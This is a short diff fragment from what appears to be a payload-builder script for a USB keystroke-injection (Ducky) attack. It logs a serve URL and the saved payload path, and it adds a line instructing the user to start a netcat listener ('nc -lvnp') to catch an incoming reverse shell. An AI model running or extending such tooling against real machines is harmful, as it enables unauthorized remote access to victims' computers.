@@ -160,3 +160,5 @@ EOF
 log "Payload ready."
 log "Serve URL: http://$IP:$PORT_SERVE/"
 log "Ducky payload saved: $OUTPUT_DIR/ducky_payload.txt"
+log "To listen for incoming connection, run: nc -lvnp $PORT_SHELL"
+
